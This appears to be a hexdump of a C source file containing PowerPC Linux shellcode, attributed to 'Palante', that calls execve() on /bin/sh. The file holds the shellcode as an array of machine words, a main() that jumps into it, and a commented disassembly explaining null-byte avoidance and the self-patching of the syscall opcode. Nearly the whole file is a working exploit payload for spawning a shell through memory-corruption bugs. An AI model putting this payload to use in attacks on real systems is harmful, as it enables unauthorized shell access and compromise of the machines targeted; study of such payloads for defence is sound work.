00000000  2f 2a 0d 0a 20 2a 20 20  4c 69 6e 75 78 20 50 50  |/*.. *  Linux PP|
00000010  43 20 73 68 65 6c 6c 63  6f 64 65 0d 0a 20 2a 20  |C shellcode.. * |
00000020  20 65 78 65 63 76 65 28  29 20 6f 66 20 2f 62 69  | execve() of /bi|
00000030  6e 2f 73 68 20 62 79 20  50 61 6c 61 6e 74 65 0d  |n/sh by Palante.|
00000040  0a 20 2a 2f 0d 0a 0d 0a  6c 6f 6e 67 20 73 68 65  |. */....long she|
00000050  6c 6c 63 6f 64 65 5b 5d  20 3d 20 7b 20 2f 2a 20  |llcode[] = { /* |
00000060  50 61 6c 61 6e 74 65 27  73 20 6c 69 6e 75 78 50  |Palante's linuxP|
00000070  50 43 20 73 68 65 6c 6c  63 6f 64 65 20 77 2f 20  |PC shellcode w/ |
00000080  4e 55 4c 4c 2a 2f 0d 0a  20 20 30 78 37 43 43 36  |NULL*/..  0x7CC6|
00000090  33 32 37 38 2c 20 30 78  32 46 38 36 37 46 46 46  |3278, 0x2F867FFF|
000000a0  2c 20 30 78 34 31 42 43  30 30 35 34 2c 20 30 78  |, 0x41BC0054, 0x|
000000b0  37 43 36 38 30 32 41 36  2c 0d 0a 20 20 30 78 42  |7C6802A6,..  0xB|
000000c0  30 43 33 46 46 46 39 2c  20 30 78 42 30 43 33 46  |0C3FFF9, 0xB0C3F|
000000d0  46 46 31 2c 20 30 78 33  38 38 36 37 46 46 30 2c  |FF1, 0x38867FF0,|
000000e0  20 30 78 33 38 41 36 37  46 46 34 2c 0d 0a 20 20  | 0x38A67FF4,..  |
000000f0  30 78 33 38 45 36 37 46  46 33 2c 20 30 78 37 43  |0x38E67FF3, 0x7C|
00000100  41 35 32 32 37 38 2c 20  30 78 37 43 45 37 32 32  |A52278, 0x7CE722|
00000110  37 38 2c 20 30 78 37 43  38 35 33 41 31 34 2c 0d  |78, 0x7C853A14,.|
00000120  0a 20 20 30 78 37 43 43  34 31 39 41 45 2c 20 30  |.  0x7CC419AE, 0|
00000130  78 37 43 30 34 32 41 31  34 2c 20 30 78 37 43 45  |x7C042A14, 0x7CE|
00000140  37 32 38 35 30 2c 20 30  78 37 43 38 35 32 41 31  |72850, 0x7C852A1|
00000150  34 2c 0d 0a 20 20 30 78  37 43 36 33 32 31 32 45  |4,..  0x7C63212E|
00000160  2c 20 30 78 37 43 38 33  32 32 31 34 2c 20 30 78  |, 0x7C832214, 0x|
00000170  37 43 43 35 32 31 32 45  2c 20 30 78 37 43 41 35  |7CC5212E, 0x7CA5|
00000180  32 41 37 38 2c 0d 0a 20  20 30 78 34 34 46 46 46  |2A78,..  0x44FFF|
00000190  46 30 32 2c 20 30 78 37  43 45 30 33 42 37 38 2c  |F02, 0x7CE03B78,|
000001a0  20 30 78 34 34 46 46 46  46 30 32 2c 20 30 78 34  | 0x44FFFF02, 0x4|
000001b0  42 46 46 46 46 42 31 2c  0d 0a 20 20 30 78 32 46  |BFFFFB1,..  0x2F|
000001c0  36 32 36 39 36 45 2c 20  30 78 32 46 37 33 36 38  |62696E, 0x2F7368|
000001d0  35 41 2c 20 30 78 46 46  46 46 46 46 46 46 2c 20  |5A, 0xFFFFFFFF, |
000001e0  30 78 46 46 46 46 46 46  46 46 0d 0a 7d 3b 0d 0a  |0xFFFFFFFF..};..|
000001f0  0d 0a 0d 0a 76 6f 69 64  20 6d 61 69 6e 28 29 0d  |....void main().|
00000200  0a 7b 0d 0a 20 20 5f 5f  61 73 6d 5f 5f 28 22 62  |.{..  __asm__("b|
00000210  20 73 68 65 6c 6c 63 6f  64 65 22 29 3b 0d 0a 7d  | shellcode");..}|
00000220  0d 0a 0d 0a 2f 2a 20 20  20 20 20 20 20 20 20 20  |..../*          |
00000230  20 20 20 20 64 69 73 61  73 73 65 6d 62 6c 79 0d  |    disassembly.|
00000240  0a 0d 0a 20 20 20 20 20  20 2e 73 65 63 74 69 6f  |...      .sectio|
00000250  6e 20 22 2e 74 65 78 74  22 20 20 20 20 20 20 23  |n ".text"      #|
00000260  20 50 61 6c 61 6e 74 65  27 73 20 4c 69 6e 75 78  | Palante's Linux|
00000270  50 50 43 20 73 68 65 6c  6c 63 6f 64 65 0d 0a 20  |PPC shellcode.. |
00000280  20 20 20 20 20 2e 61 6c  69 67 6e 20 32 0d 0a 20  |     .align 2.. |
00000290  20 20 20 20 20 2e 67 6c  6f 62 6c 20 6d 0d 0a 20  |     .globl m.. |
000002a0  20 20 20 20 20 2e 74 79  70 65 20 20 20 20 6d 2c  |     .type    m,|
000002b0  40 66 75 6e 63 74 69 6f  6e 0d 0a 20 20 6d 3a 0d  |@function..  m:.|
000002c0  0a 09 78 6f 72 20 20 36  2c 36 2c 36 20 20 20 20  |..xor  6,6,6    |
000002d0  20 20 20 20 20 20 20 20  23 20 72 36 20 69 73 20  |        # r6 is |
000002e0  30 0d 0a 09 63 6d 70 69  20 20 37 2c 30 2c 36 2c  |0...cmpi  7,0,6,|
000002f0  30 78 37 46 46 46 20 20  20 20 23 20 64 6f 20 6d  |0x7FFF    # do m|
00000300  65 61 6e 69 6e 67 6c 65  73 73 20 63 6f 6d 70 61  |eaningless compa|
00000310  72 65 0d 0a 20 20 20 20  20 20 62 63 20 31 33 2c  |re..      bc 13,|
00000320  32 38 2c 4c 32 20 20 20  20 20 20 20 20 20 20 20  |28,L2           |
00000330  23 20 63 6f 6e 64 69 74  69 6f 6e 61 6c 20 62 72  |# conditional br|
00000340  61 6e 63 68 20 74 6f 20  4c 32 20 2d 20 43 41 55  |anch to L2 - CAU|
00000350  53 45 53 20 4e 55 4c 4c  20 42 59 54 45 0d 0a 20  |SES NULL BYTE.. |
00000360  20 4c 31 3a 20 6d 66 73  70 72 20 33 2c 38 09 20  | L1: mfspr 3,8. |
00000370  20 20 20 20 20 20 20 20  20 23 20 61 64 64 72 65  |         # addre|
00000380  73 73 20 6f 66 20 2f 62  69 6e 2f 73 68 20 69 6e  |ss of /bin/sh in|
00000390  74 6f 20 72 33 20 28 65  78 65 63 76 65 20 70 61  |to r3 (execve pa|
000003a0  72 61 6d 65 74 65 72 29  0d 0a 09 09 09 0d 0a 09  |rameter)........|
000003b0  73 74 68 20 20 36 2c 2d  37 28 33 29 20 20 20 20  |sth  6,-7(3)    |
000003c0  20 20 20 20 20 20 23 20  66 69 78 20 73 63 20 6f  |      # fix sc o|
000003d0  70 63 6f 64 65 0d 0a 09  73 74 68 20 20 36 2c 2d  |pcode...sth  6,-|
000003e0  31 35 28 33 29 20 20 20  20 20 20 20 20 20 23 20  |15(3)         # |
000003f0  66 69 78 20 73 63 20 6f  70 63 6f 64 65 0d 0a 09  |fix sc opcode...|
00000400  0d 0a 09 61 64 64 69 20  34 2c 36 2c 30 78 37 46  |...addi 4,6,0x7F|
00000410  46 30 0d 0a 09 61 64 64  69 20 35 2c 36 2c 30 78  |F0...addi 5,6,0x|
00000420  37 46 46 34 0d 0a 09 61  64 64 69 20 37 2c 36 2c  |7FF4...addi 7,6,|
00000430  30 78 37 46 46 33 0d 0a  09 78 6f 72 20 20 35 2c  |0x7FF3...xor  5,|
00000440  35 2c 34 20 20 20 20 20  20 20 20 20 20 20 20 23  |5,4            #|
00000450  67 6f 74 20 30 78 34 20  69 6e 74 6f 20 72 35 0d  |got 0x4 into r5.|
00000460  0a 09 78 6f 72 20 20 37  2c 37 2c 34 20 20 20 20  |..xor  7,7,4    |
00000470  20 20 20 20 20 20 20 20  23 67 6f 74 20 30 78 33  |        #got 0x3|
00000480  20 69 6e 74 6f 20 72 37  0d 0a 0d 0a 09 0d 0a 09  | into r7........|
00000490  61 64 64 20 20 34 2c 35  2c 37 20 20 20 20 20 20  |add  4,5,7      |
000004a0  20 20 20 20 20 20 23 20  72 34 20 3d 20 30 78 37  |      # r4 = 0x7|
000004b0  0d 0a 09 73 74 62 78 20  36 2c 34 2c 33 20 20 20  |...stbx 6,4,3   |
000004c0  20 20 20 20 20 20 20 20  20 23 20 73 74 6f 72 65  |         # store|
000004d0  20 6e 75 6c 6c 20 61 66  74 65 72 20 2f 62 69 6e  | null after /bin|
000004e0  2f 73 68 0d 0a 0d 0a 09  61 64 64 20 20 30 2c 34  |/sh.....add  0,4|
000004f0  2c 35 20 20 20 20 20 20  20 20 20 20 20 20 23 20  |,5            # |
00000500  74 68 69 73 20 6d 61 6b  65 73 20 31 31 20 77 68  |this makes 11 wh|
00000510  69 63 68 20 69 73 20 74  68 65 20 65 78 65 63 76  |ich is the execv|
00000520  65 20 73 79 73 74 65 6d  20 63 61 6c 6c 0d 0a 20  |e system call.. |
00000530  20 20 20 20 20 73 75 62  20 20 37 2c 35 2c 37 20  |     sub  7,5,7 |
00000540  20 20 20 20 20 20 20 20  20 20 20 23 20 72 37 20  |           # r7 |
00000550  3d 20 30 78 31 20 66 6f  72 20 65 78 69 74 20 73  |= 0x1 for exit s|
00000560  79 73 74 65 6d 20 63 61  6c 6c 09 0d 0a 0d 0a 20  |ystem call..... |
00000570  20 20 20 20 20 61 64 64  20 20 34 2c 35 2c 35 20  |     add  4,5,5 |
00000580  20 20 20 20 20 20 20 20  20 20 20 23 20 72 34 20  |           # r4 |
00000590  3d 20 30 78 38 0d 0a 20  20 20 20 20 20 73 74 77  |= 0x8..      stw|
000005a0  78 20 33 2c 33 2c 34 20  20 20 20 20 20 20 20 20  |x 3,3,4         |
000005b0  20 20 20 23 20 61 6e 64  20 73 74 6f 72 65 20 70  |   # and store p|
000005c0  6f 69 6e 74 65 72 20 74  6f 20 2f 62 69 6e 2f 73  |ointer to /bin/s|
000005d0  68 20 61 74 20 72 33 2b  30 78 38 0d 0a 09 61 64  |h at r3+0x8...ad|
000005e0  64 20 20 34 2c 33 2c 34  20 20 20 20 20 20 20 20  |d  4,3,4        |
000005f0  20 20 20 20 23 20 72 34  20 3d 20 72 33 20 2b 20  |    # r4 = r3 + |
00000600  30 78 38 20 28 65 78 65  63 76 65 20 70 61 72 61  |0x8 (execve para|
00000610  6d 65 74 65 72 29 0d 0a  09 73 74 77 78 20 36 2c  |meter)...stwx 6,|
00000620  35 2c 34 20 20 20 20 20  20 20 20 20 20 20 20 23  |5,4            #|
00000630  20 73 74 6f 72 65 20 4e  55 4c 4c 20 70 6f 69 6e  | store NULL poin|
00000640  74 65 72 0d 0a 20 20 20  20 20 20 78 6f 72 20 35  |ter..      xor 5|
00000650  2c 35 2c 35 20 20 20 20  20 20 20 20 20 20 20 20  |,5,5            |
00000660  20 23 20 4e 55 4c 4c 20  28 65 78 65 63 76 65 20  | # NULL (execve |
00000670  70 61 72 61 6d 65 74 65  72 29 0d 0a 20 20 20 20  |parameter)..    |
00000680  20 20 2e 6c 6f 6e 67 20  20 20 30 78 34 34 66 66  |  .long   0x44ff|
00000690  66 66 30 32 20 20 20 20  23 20 6e 6f 74 20 71 75  |ff02    # not qu|
000006a0  69 74 65 20 61 6e 20 73  63 20 6f 70 63 6f 64 65  |ite an sc opcode|
000006b0  0d 0a 09 6f 72 20 30 2c  37 2c 37 20 20 20 20 20  |...or 0,7,7     |
000006c0  20 20 20 20 20 20 20 20  20 23 20 73 79 73 63 61  |         # sysca|
000006d0  6c 6c 20 31 20 2d 20 65  78 69 74 0d 0a 20 20 20  |ll 1 - exit..   |
000006e0  20 20 20 2e 6c 6f 6e 67  20 20 20 30 78 34 34 66  |   .long   0x44f|
000006f0  66 66 66 30 32 20 20 20  20 23 20 6e 6f 74 20 71  |fff02    # not q|
00000700  75 69 74 65 20 61 6e 20  73 63 20 6f 70 63 6f 64  |uite an sc opcod|
00000710  65 0d 0a 0d 0a 20 4c 32  3a 20 20 62 6c 20 4c 31  |e.... L2:  bl L1|
00000720  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000730  20 23 20 62 72 61 6e 63  68 20 61 6e 64 20 6c 69  | # branch and li|
00000740  6e 6b 20 62 61 63 6b 20  74 6f 20 4c 31 0d 0a 20  |nk back to L1.. |
00000750  20 20 20 20 20 2e 6c 6f  6e 67 20 30 78 32 46 36  |     .long 0x2F6|
00000760  32 36 39 36 45 20 20 20  20 20 20 23 2f 62 69 6e  |2696E      #/bin|
00000770  2f 73 68 5a 0d 0a 20 20  20 20 20 20 2e 6c 6f 6e  |/shZ..      .lon|
00000780  67 20 30 78 32 46 37 33  36 38 35 41 0d 0a 20 20  |g 0x2F73685A..  |
00000790  20 20 20 20 2e 6c 6f 6e  67 20 30 78 66 66 66 66  |    .long 0xffff|
000007a0  66 66 66 66 20 20 20 20  20 20 23 20 74 68 69 73  |ffff      # this|
000007b0  20 69 73 20 77 68 65 72  65 20 70 6f 69 6e 74 65  | is where pointe|
000007c0  72 20 74 6f 20 2f 62 69  6e 2f 73 68 20 67 6f 65  |r to /bin/sh goe|
000007d0  73 0d 0a 20 20 20 20 20  20 2e 6c 6f 6e 67 20 30  |s..      .long 0|
000007e0  78 66 66 66 66 66 66 66  66 20 20 20 20 20 20 23  |xffffffff      #|
000007f0  20 74 68 69 73 20 69 73  20 77 68 65 72 65 20 6e  | this is where n|
00000800  75 6c 6c 20 70 6f 69 6e  74 65 72 20 67 6f 65 73  |ull pointer goes|
00000810  0d 0a 0d 0a 20 2e 4c 66  65 31 3a 0d 0a 20 20 2e  |.... .Lfe1:..  .|
00000820  73 69 7a 65 20 20 20 20  6d 2c 2e 4c 66 65 31 2d  |size    m,.Lfe1-|
00000830  6d 0d 0a 0d 0a 2a 2f                              |m....*/|
00000837
